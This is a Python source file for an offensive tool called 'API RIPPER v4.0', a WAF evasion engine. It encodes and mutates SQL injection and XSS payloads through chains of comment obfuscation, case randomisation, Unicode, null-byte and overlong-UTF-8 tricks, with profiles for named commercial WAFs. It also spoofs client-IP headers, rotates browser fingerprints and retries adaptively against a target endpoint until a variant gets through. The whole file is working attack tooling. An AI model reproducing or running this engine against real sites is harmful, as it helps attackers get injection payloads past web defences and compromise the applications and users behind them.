"""
API RIPPER v4.0 — Elite WAF Evasion Engine
Advanced polymorphic encoding, protocol-level bypass, and adaptive
strategy selection to defeat enterprise WAF solutions.

Capabilities:
  Layer 1: Polymorphic Payload Encoding — Multi-stage encoding chains
  Layer 2: Protocol-Level Evasion — HTTP smuggling, chunked encoding abuse
  Layer 3: Behavioral Mimicry — Browser fingerprint emulation
  Layer 4: Adaptive Strategy — ML-inspired feedback loop for bypass selection
  Layer 5: Context-Aware Mutation — WAF-specific bypass techniques

Supported WAFs:
  Cloudflare, AWS WAF/Shield, Akamai, Imperva/Incapsula, ModSecurity,
  F5 BIG-IP ASM, Fortinet FortiWeb, Sucuri, Barracuda, Azure Front Door
"""

import asyncio
import base64
import hashlib
import logging
import random
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# ── Encoding Primitives ─────────────────────────────────────

class EncodingPrimitive:
    """Atomic encoding transformations composable into chains."""

    @staticmethod
    def url_encode(payload: str, level: int = 1) -> str:
        result = payload
        for _ in range(level):
            result = urllib.parse.quote(result, safe='')
        return result

    @staticmethod
    def unicode_fullwidth(payload: str) -> str:
        """Replace ASCII with Unicode fullwidth equivalents."""
        out = []
        for c in payload:
            cp = ord(c)
            if 0x21 <= cp <= 0x7E:
                out.append(chr(cp + 0xFEE0))
            else:
                out.append(c)
        return ''.join(out)

    @staticmethod
    def unicode_nfkc_bypass(payload: str) -> str:
        """Use characters that normalize to target chars under NFKC."""
        _map = {
            '<': '\uFF1C', '>': '\uFF1E', "'": '\uFF07', '"': '\uFF02',
            '(': '\uFF08', ')': '\uFF09', '/': '\uFF0F', '\\': '\uFF3C',
            '=': '\uFF1D', ';': '\uFF1B', '|': '\uFF5C',
        }
        return ''.join(_map.get(c, c) for c in payload)

    @staticmethod
    def html_entity_encode(payload: str, use_hex: bool = False) -> str:
        out = []
        for c in payload:
            if c.isalnum() or c in ' \t':
                out.append(c)
            elif use_hex:
                out.append(f'&#x{ord(c):x};')
            else:
                out.append(f'&#{ord(c)};')
        return ''.join(out)

    @staticmethod
    def js_unicode_escape(payload: str) -> str:
        return ''.join(f'\\u{ord(c):04x}' if not c.isalnum() else c for c in payload)

    @staticmethod
    def sql_comment_obfuscate(payload: str) -> str:
        """Insert inline SQL comments between keywords."""
        kw = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR',
              'INSERT', 'UPDATE', 'DELETE', 'DROP', 'SLEEP',
              'WAITFOR', 'BENCHMARK', 'ORDER', 'GROUP', 'HAVING']
        result = payload
        for k in kw:
            pattern = re.compile(re.escape(k), re.IGNORECASE)
            if pattern.search(result):
                obf = '/**/'.join(k)
                result = pattern.sub(obf, result, count=1)
        return result

    @staticmethod
    def sql_case_randomize(payload: str) -> str:
        kw = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR',
              'SLEEP', 'WAITFOR', 'BENCHMARK', 'NULL', 'TRUE', 'FALSE']
        result = payload
        for k in kw:
            pat = re.compile(re.escape(k), re.IGNORECASE)
            if pat.search(result):
                swapped = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in k)
                result = pat.sub(swapped, result, count=1)
        return result

    @staticmethod
    def sql_whitespace_substitute(payload: str) -> str:
        """Replace spaces with alternate whitespace chars that SQL accepts."""
        subs = ['\t', '\n', '\r', '\x0b', '\x0c', '/**/']
        return payload.replace(' ', random.choice(subs))

    @staticmethod
    def null_byte_inject(payload: str) -> str:
        return payload.replace(' ', '%00 ').replace('=', '%00=')

    @staticmethod
    def concat_split_sql(payload: str) -> str:
        """Split string literals via SQL concatenation."""
        if "'" in payload:
            parts = payload.split("'")
            if len(parts) >= 3 and len(parts[1]) > 2:
                inner = parts[1]
                mid = len(inner) // 2
                return payload.replace(f"'{inner}'", f"'{inner[:mid]}'||'{inner[mid:]}'")
        return payload

    @staticmethod
    def hex_encode_string(payload: str) -> str:
        """Encode string portions as hex for SQL."""
        if "'" in payload:
            parts = payload.split("'")
            if len(parts) >= 3:
                inner = parts[1]
                hex_val = '0x' + inner.encode().hex()
                return payload.replace(f"'{inner}'", hex_val)
        return payload

    @staticmethod
    def base64_encode(payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def chunked_payload(payload: str, chunk_size: int = 3) -> str:
        """Split payload for chunked transfer encoding abuse."""
        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
        parts = []
        for chunk in chunks:
            parts.append(f"{len(chunk):x}\r\n{chunk}\r\n")
        parts.append("0\r\n\r\n")
        return ''.join(parts)


# ── Encoding Chain ──────────────────────────────────────────

@dataclass
class EncodingChain:
    """A composable chain of encoding transformations."""
    name: str
    steps: List[str]  # Names of EncodingPrimitive methods
    waf_targets: List[str] = field(default_factory=list)  # WAFs this chain bypasses
    success_count: int = 0
    fail_count: int = 0

    @property
    def success_rate(self) -> float:
        total = self.success_count + self.fail_count
        return self.success_count / total if total > 0 else 0.5

    def apply(self, payload: str) -> str:
        result = payload
        for step in self.steps:
            func = getattr(EncodingPrimitive, step, None)
            if func:
                try:
                    result = func(result)
                except Exception:
                    pass
        return result


# ── WAF-Specific Bypass Profiles ────────────────────────────

WAF_BYPASS_PROFILES: Dict[str, Dict] = {
    "cloudflare": {
        "chains": [
            EncodingChain("cf_unicode", ["unicode_fullwidth"], ["cloudflare"]),
            EncodingChain("cf_double_url", ["url_encode", "url_encode"], ["cloudflare"]),
            EncodingChain("cf_comment_case", ["sql_comment_obfuscate", "sql_case_randomize"], ["cloudflare"]),
            EncodingChain("cf_whitespace", ["sql_whitespace_substitute", "sql_case_randomize"], ["cloudflare"]),
        ],
        "headers": {
            "X-Forwarded-For": "127.0.0.1",
            "CF-Connecting-IP": "127.0.0.1",
        },
        "techniques": ["origin_ip_bypass", "websocket_upgrade", "http2_push"],
    },
    "aws_waf": {
        "chains": [
            EncodingChain("aws_nfkc", ["unicode_nfkc_bypass"], ["aws_waf"]),
            EncodingChain("aws_null", ["null_byte_inject"], ["aws_waf"]),
            EncodingChain("aws_hex", ["hex_encode_string", "sql_case_randomize"], ["aws_waf"]),
            EncodingChain("aws_concat", ["concat_split_sql", "sql_whitespace_substitute"], ["aws_waf"]),
        ],
        "headers": {},
        "techniques": ["content_type_mismatch", "overlong_header"],
    },
    "imperva": {
        "chains": [
            EncodingChain("imp_double_url", ["url_encode", "url_encode"], ["imperva"]),
            EncodingChain("imp_html_hex", ["html_entity_encode"], ["imperva"]),
            EncodingChain("imp_comment", ["sql_comment_obfuscate", "null_byte_inject"], ["imperva"]),
        ],
        "headers": {"X-Forwarded-Host": "localhost"},
        "techniques": ["json_content_type_swap", "multipart_boundary"],
    },
    "modsecurity": {
        "chains": [
            EncodingChain("mod_case_ws", ["sql_case_randomize", "sql_whitespace_substitute"], ["modsecurity"]),
            EncodingChain("mod_comment_hex", ["sql_comment_obfuscate", "hex_encode_string"], ["modsecurity"]),
            EncodingChain("mod_unicode", ["unicode_nfkc_bypass"], ["modsecurity"]),
        ],
        "headers": {},
        "techniques": ["paranoia_level_probe", "multipart_abuse"],
    },
    "f5_bigip": {
        "chains": [
            EncodingChain("f5_double", ["url_encode", "url_encode"], ["f5_bigip"]),
            EncodingChain("f5_concat", ["concat_split_sql", "sql_case_randomize"], ["f5_bigip"]),
        ],
        "headers": {},
        "techniques": ["content_length_mismatch"],
    },
    "generic": {
        "chains": [
            EncodingChain("gen_url", ["url_encode"], []),
            EncodingChain("gen_case", ["sql_case_randomize"], []),
            EncodingChain("gen_comment", ["sql_comment_obfuscate"], []),
            EncodingChain("gen_unicode", ["unicode_fullwidth"], []),
            EncodingChain("gen_null", ["null_byte_inject"], []),
        ],
        "headers": {},
        "techniques": [],
    },
}


# ── Browser Fingerprint Pools ───────────────────────────────

BROWSER_PROFILES = [
    {
        "name": "chrome_win",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Sec-Ch-Ua": '"Chromium";v="126", "Google Chrome";v="126", "Not-A.Brand";v="8"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
    },
    {
        "name": "firefox_linux",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "DNT": "1",
    },
    {
        "name": "safari_mac",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-GB,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
    },
    {
        "name": "api_client",
        "User-Agent": "PostmanRuntime/7.37.3",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br",
    },
]


# ── Evasion Result ──────────────────────────────────────────

@dataclass
class EvasionResult:
    """Result of an evasion attempt."""
    original_payload: str = ""
    encoded_payload: str = ""
    chain_used: str = ""
    bypassed: bool = False
    waf_detected: str = "unknown"
    response_status: int = 0
    evidence: Dict[str, Any] = field(default_factory=dict)


# ── WAF Evasion Engine ──────────────────────────────────────

class WAFEvasionEngine:
    """
    Elite WAF evasion engine with adaptive strategy selection.

    Flow:
      1. Detect WAF type from response signatures
      2. Select WAF-specific encoding chains
      3. Apply polymorphic encoding with feedback loop
      4. Generate browser-mimicry headers
      5. Track bypass success/failure for adaptive learning

    Usage:
        engine = WAFEvasionEngine()
        engine.set_waf_profile("cloudflare")
        variants = engine.generate_evasion_variants(payload, max_variants=8)
        headers = engine.get_mimicry_headers()
    """

    def __init__(self, waf_name: str = "generic"):
        self._waf_name = waf_name
        self._profile = WAF_BYPASS_PROFILES.get(waf_name, WAF_BYPASS_PROFILES["generic"])
        self._chain_history: Dict[str, Dict] = {}  # chain_name -> {success, fail}
        self._blocked_encodings: set = set()
        self._successful_encodings: List[str] = []
        self._request_count = 0
        self._bypass_count = 0
        self._block_count = 0
        self._browser_profile = random.choice(BROWSER_PROFILES)
        self._session_cookies: Dict[str, str] = {}
        self._adaptive_delay = 0.2
        self._consecutive_blocks = 0

    # ── Configuration ───────────────────────────────────────

    def set_waf_profile(self, waf_name: str):
        """Set WAF profile for targeted evasion."""
        self._waf_name = waf_name
        self._profile = WAF_BYPASS_PROFILES.get(waf_name, WAF_BYPASS_PROFILES["generic"])
        logger.info(f"[WAFEvasion] Profile set: {waf_name} ({len(self._profile['chains'])} chains)")

    # ── Payload Generation ──────────────────────────────────

    def generate_evasion_variants(self, payload: str, max_variants: int = 8) -> List[Dict[str, str]]:
        """
        Generate multiple WAF-evading variants of a payload.
        Returns list of {"payload": encoded_str, "chain": chain_name, "priority": float}
        """
        variants = [{"payload": payload, "chain": "original", "priority": 0.5}]

        # Get WAF-specific chains + generic fallback
        chains = list(self._profile.get("chains", []))
        if self._waf_name != "generic":
            chains.extend(WAF_BYPASS_PROFILES["generic"]["chains"])

        # Sort chains by historical success rate
        chains.sort(key=lambda c: c.success_rate, reverse=True)

        # Prioritize previously successful chains
        for chain_name in self._successful_encodings[:3]:
            for c in chains:
                if c.name == chain_name:
                    chains.remove(c)
                    chains.insert(0, c)
                    break

        for chain in chains:
            if chain.name in self._blocked_encodings:
                continue
            try:
                encoded = chain.apply(payload)
                if encoded and encoded != payload and encoded not in [v["payload"] for v in variants]:
                    priority = chain.success_rate
                    if chain.name in self._successful_encodings:
                        priority += 0.3
                    variants.append({
                        "payload": encoded,
                        "chain": chain.name,
                        "priority": min(1.0, priority),
                    })
            except Exception:
                pass

            if len(variants) >= max_variants:
                break

        # Add protocol-level evasion variants
        proto_variants = self._generate_protocol_variants(payload)
        for pv in proto_variants:
            if len(variants) >= max_variants:
                break
            if pv["payload"] not in [v["payload"] for v in variants]:
                variants.append(pv)

        # Sort by priority descending
        variants.sort(key=lambda v: v["priority"], reverse=True)
        return variants[:max_variants]

    def _generate_protocol_variants(self, payload: str) -> List[Dict[str, str]]:
        """Generate protocol-level evasion payloads."""
        variants = []

        # Content-Type mismatch: send JSON body with form content-type
        if '{' not in payload:
            variants.append({
                "payload": payload,
                "chain": "content_type_mismatch",
                "priority": 0.6,
                "content_type": "application/x-www-form-urlencoded",
                "actual_format": "json",
            })

        # Overlong UTF-8 encoding
        overlong = self._overlong_utf8(payload)
        if overlong != payload:
            variants.append({
                "payload": overlong,
                "chain": "overlong_utf8",
                "priority": 0.55,
            })

        return variants

    @staticmethod
    def _overlong_utf8(payload: str) -> str:
        """Generate overlong UTF-8 sequences for specific characters."""
        _map = {'<': '%C0%BC', '>': '%C0%BE', "'": '%C0%A7', '/': '%C0%AF'}
        result = payload
        for char, enc in _map.items():
            result = result.replace(char, enc)
        return result

    # ── Header Generation ───────────────────────────────────

    def get_mimicry_headers(self, rotate: bool = True) -> Dict[str, str]:
        """
        Generate browser-mimicry headers to evade behavioral WAF detection.
        Rotates browser profiles to avoid fingerprint-based blocking.
        """
        if rotate and self._request_count % 10 == 0:
            self._browser_profile = random.choice(BROWSER_PROFILES)

        self._request_count += 1
        headers = {}

        # Copy browser profile headers (skip 'name')
        for k, v in self._browser_profile.items():
            if k != "name":
                headers[k] = v

        # Add WAF-specific bypass headers
        waf_headers = self._profile.get("headers", {})
        headers.update(waf_headers)

        # Add noise headers to vary fingerprint
        if random.random() > 0.5:
            headers["DNT"] = "1"
        if random.random() > 0.6:
            headers["Cache-Control"] = random.choice(["no-cache", "max-age=0"])
        if random.random() > 0.7:
            referers = ["https://www.google.com/", "https://www.bing.com/",
                        "https://duckduckgo.com/", ""]
            ref = random.choice(referers)
            if ref:
                headers["Referer"] = ref

        # Session cookie continuity
        if self._session_cookies:
            cookie_str = "; ".join(f"{k}={v}" for k, v in self._session_cookies.items())
            headers["Cookie"] = cookie_str

        return headers

    # ── Feedback Loop ───────────────────────────────────────

    def record_result(self, chain_name: str, bypassed: bool, status_code: int = 0):
        """Record evasion result for adaptive learning."""
        if chain_name not in self._chain_history:
            self._chain_history[chain_name] = {"success": 0, "fail": 0}

        if bypassed:
            self._chain_history[chain_name]["success"] += 1
            self._bypass_count += 1
            self._consecutive_blocks = 0
            self._adaptive_delay = max(0.1, self._adaptive_delay * 0.9)
            if chain_name not in self._successful_encodings:
                self._successful_encodings.append(chain_name)
            # Update chain object
            for chain in self._profile.get("chains", []):
                if chain.name == chain_name:
                    chain.success_count += 1
        else:
            self._chain_history[chain_name]["fail"] += 1
            self._block_count += 1
            self._consecutive_blocks += 1
            self._adaptive_delay = min(5.0, self._adaptive_delay * 1.5)
            for chain in self._profile.get("chains", []):
                if chain.name == chain_name:
                    chain.fail_count += 1
            # Block consistently failing chains
            hist = self._chain_history[chain_name]
            if hist["fail"] >= 5 and hist["success"] == 0:
                self._blocked_encodings.add(chain_name)
                logger.debug(f"[WAFEvasion] Chain '{chain_name}' blocked (5 consecutive failures)")

    def preserve_cookies(self, response_cookies: Dict[str, str]):
        """Preserve WAF session cookies for continuity."""
        self._session_cookies.update(response_cookies)

    async def adaptive_delay(self):
        """Apply adaptive delay with jitter."""
        jitter = self._adaptive_delay * random.uniform(-0.3, 0.3)
        delay = max(0.05, self._adaptive_delay + jitter)
        if self._consecutive_blocks > 3:
            delay = min(10.0, delay * (2 ** min(self._consecutive_blocks - 3, 4)))
        await asyncio.sleep(delay)

    def should_abort(self) -> bool:
        """Check if WAF blocking is too aggressive to continue."""
        return self._consecutive_blocks > 15

    # ── Evasion Test Suite ──────────────────────────────────

    async def test_evasion(self, request_func, endpoint: str,
                           payload: str, method: str = "GET",
                           param: str = "id", location: str = "query") -> EvasionResult:
        """
        Test a payload with multiple evasion strategies against an endpoint.
        Returns the first successful evasion or the best attempt.
        """
        best_result = EvasionResult(original_payload=payload, waf_detected=self._waf_name)
        variants = self.generate_evasion_variants(payload, max_variants=6)

        for variant in variants:
            await self.adaptive_delay()
            headers = self.get_mimicry_headers()
            encoded = variant["payload"]

            # Build request
            if location == "query":
                sep = "&" if "?" in endpoint else "?"
                url = f"{endpoint}{sep}{param}={encoded}"
            else:
                url = endpoint

            resp = await request_func(url, method, headers=headers)
            if not resp:
                continue

            status = resp.get("status", 0)
            is_blocked = status in (403, 406, 429, 503)

            self.record_result(variant["chain"], bypassed=not is_blocked, status_code=status)

            if resp.get("cookies"):
                self.preserve_cookies(resp["cookies"])

            if not is_blocked and status > 0:
                best_result.encoded_payload = encoded
                best_result.chain_used = variant["chain"]
                best_result.bypassed = True
                best_result.response_status = status
                best_result.evidence = {
                    "chain": variant["chain"],
                    "status": status,
                    "waf": self._waf_name,
                    "attempt": variants.index(variant) + 1,
                }
                return best_result

        return best_result

    # ── Statistics ──────────────────────────────────────────

    def stats(self) -> Dict[str, Any]:
        """Engine performance statistics."""
        total = self._bypass_count + self._block_count
        return {
            "waf_name": self._waf_name,
            "total_attempts": total,
            "bypasses": self._bypass_count,
            "blocks": self._block_count,
            "bypass_rate": round(self._bypass_count / max(total, 1), 3),
            "active_chains": len(self._profile.get("chains", [])) - len(self._blocked_encodings),
            "blocked_chains": list(self._blocked_encodings),
            "top_chains": sorted(
                self._chain_history.items(),
                key=lambda x: x[1]["success"], reverse=True
            )[:5],
            "browser_profile": self._browser_profile.get("name", "unknown"),
            "adaptive_delay": round(self._adaptive_delay, 3),
            "consecutive_blocks": self._consecutive_blocks,
        }

    def to_dict(self) -> Dict[str, Any]:
        return self.stats()
